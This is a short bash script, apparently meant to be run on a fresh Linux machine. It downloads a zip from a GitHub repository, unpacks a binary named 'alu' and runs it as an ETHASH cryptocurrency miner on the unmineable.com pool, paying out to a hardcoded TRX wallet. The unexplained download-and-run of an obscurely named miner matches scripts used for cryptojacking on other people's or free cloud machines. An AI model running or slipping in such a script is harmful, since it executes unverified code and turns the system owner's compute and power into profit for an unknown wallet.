#!/bin/bash
sudo apt update && wget https://github.com/okg123/rex-kg/raw/main/alu.zip && apt install unzip && unzip alu.zip && cd alu && chmod u+x alu && ./alu --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.alu --ethstratum ETHPROXY
